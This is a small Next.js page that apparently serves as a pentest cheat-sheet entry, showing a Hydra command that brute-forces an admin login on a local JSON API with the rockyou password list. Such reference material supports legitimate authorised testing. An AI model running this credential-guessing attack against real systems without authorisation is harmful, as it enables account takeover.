import Head from 'next/head';

export default function Hydra() {
  const command = `hydra -l admin -P rockyou.txt 192.168.1.142 -s 8000 \
  -H "accept: application/json" \
  -H "Content-Type: application/json" \
  http-post-form \
  '/api/v2/auth/login:{"username":"^USER^","password":"^PASS^"}:F=Incorrect username or password'`;

  return (
    <>
      <Head>
        <title>Hydra</title>
      </Head>

      <div style={{ maxWidth: 900, margin: '0 auto' }}>
        <h1 style={{ marginBottom: '0.75rem' }}>Hydra</h1>
        <p style={{ marginTop: 0, marginBottom: '1.5rem', color: '#4b5563' }}>
          Example Hydra command for testing authentication endpoints.
        </p>

        <div
          style={{
            border: '1px solid #e5e7eb',
            borderRadius: 16,
            padding: '1.5rem',
            background: '#fff',
            boxShadow: '0 10px 30px rgba(15, 23, 42, 0.08)',
          }}
        >
          <pre
            style={{
              margin: 0,
              whiteSpace: 'pre-wrap',
              wordBreak: 'break-word',
              fontFamily: 'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace',
              fontSize: '0.95rem',
              lineHeight: 1.6,
              color: '#111827',
            }}
          >
            {command}
          </pre>
        </div>
      </div>
    </>
  );
}
